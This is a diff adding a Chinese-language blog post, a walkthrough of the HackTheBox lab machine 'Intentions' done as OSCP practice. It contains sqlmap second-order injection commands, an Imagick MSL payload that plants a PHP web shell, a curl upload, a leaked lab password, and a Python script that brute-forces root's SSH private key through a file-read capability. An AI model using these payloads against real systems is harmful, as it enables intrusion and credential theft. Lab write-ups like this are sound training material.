@@ -1,0 +1,388 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>OSCP-Intentions | Hustler&#39;s Blog</title>
+  <meta name="author" content="Hustler">
+  
+  <meta name="description" content="Everybody needs love,but hacker dont">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="OSCP-Intentions"/>
+  <meta property="og:site_name" content="Hustler&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> OSCP-Intentions</h1>
+		</div>
+	
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Intentions"><a href="#Intentions" class="headerlink" title="Intentions"></a>Intentions</h1><h2 id="来源：HackTheBox"><a href="#来源：HackTheBox" class="headerlink" title="来源：HackTheBox"></a>来源：HackTheBox</h2><h3 id="难度：Hard"><a href="#难度：Hard" class="headerlink" title="难度：Hard"></a>难度：Hard</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sV</span> -p- <span class="token number">10.10</span>.11.243<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>没有什么特别的端口，只有常规22，80，直接访问80发现是一个登录口，注册登陆后测试了很多没有思路，看wp说要二次注入，并且用的是sqlmap（OSCP考试不允许使用）</p>
+<h4 id="SQLMAP二次注入"><a href="#SQLMAP二次注入" class="headerlink" title="SQLMAP二次注入"></a>SQLMAP二次注入</h4><p>浏览网页以及wp，最后发现只有profile里的偏好设置会读取用户输入进入数据库，而feed会根据这个偏好设置读取数据库返回内容</p>
+<p>偏好设置：<br><img src="/images/OSCPIntentions/1.JPG"><br><img src="/images/OSCPIntentions/2.JPG"></p>
+<p>feed返回：<br><img src="/images/OSCPIntentions/3.JPG"><br><img src="/images/OSCPIntentions/4.JPG"></p>
+<p>经过测试，我们发现在设置偏好的时候，假设填入<code>food , animal</code>这样的语句，会被替换成这样<code>food,animal</code>，其中的空格会自动替换成空，猜测有过滤措施，所以使用sqlmap的时候需要尝试使用其自带的“将所有空格换成注释”的脚本</p>
+<p>我们将更改偏好设置和获取返回的数据包分别保存，然后使用如下语句：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> update.txt --second-req<span class="token operator">=</span>getresponse.txt <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
+
+<span class="token comment"># update.txt 修改偏好设置的数据包</span>
+<span class="token comment"># getresponse.txt 根据编号设置返回的推荐内容的数据包</span>
+<span class="token comment"># --tamper=space2comment 注释替换空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>尝试注入：<br><img src="/images/OSCPIntentions/5.JPG"><br>能注出数据</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">--dbs</span>
+<span class="token parameter variable">--tables</span> <span class="token parameter variable">-D</span> dbname
+<span class="token parameter variable">--columns</span> <span class="token parameter variable">-T</span> table <span class="token parameter variable">-D</span> dbname
+<span class="token parameter variable">--dump</span> <span class="token parameter variable">-T</span> table <span class="token parameter variable">-D</span> dbname <span class="token comment"># 爆表所有数据</span>
+<span class="token parameter variable">--dump</span> <span class="token parameter variable">-C</span> <span class="token string">"user,avatar,user_id,password"</span> <span class="token parameter variable">-T</span> table <span class="token parameter variable">-D</span> dbname <span class="token comment"># 按字段爆数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>能看到有两个账户有密码hash，admin字段为1，估计是管理员账号：<br><img src="/images/OSCPIntentions/6.JPG"><br>接下来陷入了难题，该拿这些hash怎么办，cmd5解不开，直接登录登不上<br>看wp，傻了忘了爆破api了，&#x2F;api&#x2F;vi&#x2F;爆一下，爆不出来，换个v2爆一下，爆出来&#x2F;api&#x2F;v2&#x2F;auth&#x2F;login</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-w</span> dict.txt <span class="token parameter variable">-e</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-u</span> url <span class="token parameter variable">-b</span> <span class="token number">403,404</span>
+
+dir：使用目录/文件枚举模式（而非 DNS 或 VHOST）。
+<span class="token parameter variable">-w</span> dict.txt：使用 dict.txt 作为字典文件。
+-e：自动递归发现的目录（如果有权限访问会继续深度爆破）。
+<span class="token parameter variable">-t</span> <span class="token number">100</span>：使用 <span class="token number">100</span> 个线程（速度快，但也可能触发WAF或封IP，酌情调整）。
+<span class="token parameter variable">-u</span> url：目标 URL（例如：http://example.com）。
+<span class="token parameter variable">-b</span> <span class="token number">403,404</span>：屏蔽状态码为 <span class="token number">403</span> 和 <span class="token number">404</span> 的响应（常见的“禁止访问”和“未找到”页面），不显示在结果中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/OSCPIntentions/7.JPG"><br>测试发现这个接口要post，并且知道了参数：<br><img src="/images/OSCPIntentions/8.JPG"><br>有hash，直接秒了，抓包改登陆包：<br><img src="/images/OSCPIntentions/9.JPG"><br><img src="/images/OSCPIntentions/10.JPG"><br><img src="/images/OSCPIntentions/11.JPG"><br>进去默认是相册dashboard，目录改admin秒了，浏览网站来到这么一个功能：<br><img src="/images/OSCPIntentions/12.JPG"><br><img src="/images/OSCPIntentions/13.JPG"><br>修改图片滤镜，抓个包，很好啊，出现了绝对路径：<br><img src="/images/OSCPIntentions/14.JPG"><br>尝试包含，没有用，卡在这里了，但是可以远程包含<br>查阅资料得知，php有一个插件叫做Imagick，可以通过包含特定payload来打一个rce<br>我们现在知道：<br>1.这是个画廊应用，并且跑着php，所以可能有Imagick<br>2.我们知道他的绝对路径<br>参考这篇文章，讲了Imagick的洞：<a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a><br>构造payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>caption:<span class="token entity named-entity" title="&lt;">&amp;lt;</span>?php @passthru(@$_REQUEST['c']); ?<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info:/var/www/html/intentions/storage/app/public/rce.php<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>抓包搞成chunk-post（文件上传的格式），wp用curl，由于我不会搞，这里直接抄：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">'http://10.10.11.220/api/v2/admin/image/modify'</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-H</span> <span class="token string">'X-XSRF-TOKEN:
+token'</span> <span class="token parameter variable">-H</span> <span class="token string">'Cookie: cookie'</span> <span class="token parameter variable">-F</span> <span class="token string">'path=vid:msl:/tmp/php*'</span> <span class="token parameter variable">-F</span> <span class="token string">'effect=asd'</span> <span class="token parameter variable">-F</span> <span class="token assign-left variable">file</span><span class="token operator">=</span>@payload.msl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/OSCPIntentions/15.JPG"><br>其他说明：<br><img src="/images/OSCPIntentions/17.JPG"><br>现在我们就可以在图片目录下找到rce.php文件，然后直接?c&#x3D;cmd打一个python反弹shell了：<br><img src="/images/OSCPIntentions/16.JPG"><br>咋一看这shell有点幽默了，没flag，权限也是烂的，再一看，又傻了，忘记ls要-a了，有一个.git目录，进去先用<code>git log -p</code>看看历史记录：<br><img src="/images/OSCPIntentions/18.JPG"><br>提示这个.git被root拥有，要运行这个git config什么的命令才可以，运行发现权限又不够，怎么办，查看git文档，哦原来这个会去用户家目录下去查找配置文件，找不到再创建，那我们更改环境变量，给一个我们有权限的目录比如&#x2F;tmp：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/tmp <span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--add</span> safe.directory /var/www/html/intentions <span class="token comment"># 将intentions目录添加到可以运行这个命令的白名单中</span>
+<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/tmp <span class="token function">git</span> log <span class="token parameter variable">-p</span> <span class="token comment"># 再次运行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>ok成功获得greg用户密码，ssh美美登录：<br><img src="/images/OSCPIntentions/19.JPG"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">greg
+Gr3g1sTh3B3stDev3l0per<span class="token operator">!</span><span class="token number">1998</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>结束了吗？没的，兄弟，没的，提权来了<br>发现妙妙文件，这个东西貌似是检查一个文本的：<br><img src="/images/OSCPIntentions/20.JPG"><br>问一下AI：</p>
+<pre class="line-numbers language-none"><code class="language-none">该图库系统：
+通过计算上传文件的 MD5 值，对比一个黑名单；
+黑名单来自如 dmca_hashes.test 这样的文件；
+
+用于：
+避免上传 侵权内容；
+避免图库中出现 重复图片。
+如果你要分析或绕过这种机制，可以考虑：
+对同一图片轻微修改像素或元数据，改变其 MD5；
+检查 MD5 黑名单的来源、内容、匹配方式是否大小写敏感等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个opt&#x2F;scanner&#x2F;scaner很奇怪，所有者为root，但是其他用户可以执行<br>这个程序，不是 setuid 程序（即它没有通过 chmod u+s 获得 root 权限）；<br>也不是通过 sudo 执行的（当前用户权限没有被临时提升）；<br>因此，它按理说没有读取权限，但却能读取文件，这就很奇怪。</p>
+<p>使用getcap查看其Linux文件能力，结果发现他被授予了<code>cap_dac_read_search</code>,这个能力允许程序,绕过文件的读权限和目录搜索权限检查，只要被赋予了这个能力，程序就可以任意文件读取</p>
+<p>好了，我们现在知道可能有任意文件读取了，要怎么提权呢？可以尝试用这个程序去读去ssh私钥<br>我们看看这个程序的帮助菜单：<br><img src="/images/OSCPIntentions/21.JPG"><br>非常好，我们发现这个程序可以指定读取文件，还能指定检查文件的多少个字节<br>这就很有趣了，试想，我们只比较一个字节的hash，虽然我们不知道这个字节是多少，但是我们可以通过生成不同的hash去匹配来爆破，比如要读取的文件的开头第一个字节是’b’，我们手上其实是可以提前生成一份所有可见字符的hash，然后去比对，如果跟b的hash比对成功了，我们就可以知道开头的第一个字节是’b’，以此类推，我们是可以爆破出要读取的任何文件的，这里直接上payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> subprocess
+base <span class="token operator">=</span> <span class="token string">""</span>
+hasResult <span class="token operator">=</span> <span class="token boolean">True</span>
+hashMap <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+readFile <span class="token operator">=</span> <span class="token string">"/root/.ssh/id_rsa"</span>
+
+<span class="token keyword">def</span> <span class="token function">checkMatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> base
+    <span class="token keyword">global</span> hashMap
+    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/opt/scanner/scanner"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span>readFile<span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"./hash.log"</span><span class="token punctuation">,</span><span class="token string">"-l"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> line <span class="token keyword">in</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">:</span>
+        <span class="token comment">#print(line)</span>
+        line <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"[+]"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+            check <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
+                <span class="token keyword">if</span> check<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> hashMap<span class="token punctuation">:</span>
+                    base <span class="token operator">=</span> hashMap<span class="token punctuation">[</span>check<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+                    <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">writeFile</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hash.log"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
+    hashmap <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">for</span> character <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
+        check <span class="token operator">=</span> base <span class="token operator">+</span> character
+        checkHash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>check<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        md5 <span class="token operator">=</span> checkHash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        hashMap<span class="token punctuation">[</span>md5<span class="token punctuation">]</span> <span class="token operator">=</span> check
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>md5 <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> md5<span class="token punctuation">)</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">while</span> hasResult<span class="token punctuation">:</span>
+    writeFile<span class="token punctuation">(</span>base<span class="token punctuation">)</span>
+    hasResult <span class="token operator">=</span> checkMatch<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功读取，随后给这个读出来的key加权限，然后本地ssh连接（必须再greg这个用户去本地ssh连root，否则会报key不安全的错误，无法连接）<br><img src="/images/OSCPIntentions/22.JPG"><br>成功提权</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+
+</div>
+
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2099/05/09/infogather/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/05/07/OSCP-Broker/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-05-09 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>14</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>14</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/">HackTheBox<span>6</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/Hard/">Hard<span>1</span></a></li>
+
+<div class="widget tag">
+  <h3 class="title">All Categories</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Crypto/">Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E8%93%9D%E9%98%9F/">蓝队</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/">HackTheBox</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Easy/">Easy</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Hard/">Hard</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Medium/">Medium</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Easy/">Easy</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Intermediate/">Intermediate</a><span class="category-list-count">5</span></li></ul></li></ul></li></ul></li></ul> 
+</div>
+ 
+  </li>
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/OSCP/">OSCP<span>14</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>14</span></a></li> <li><a href="/tags/HackTheBox/">HackTheBox<span>6</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!-- -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 Hustler's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+<br>
+<p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv" style="display: inline;">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
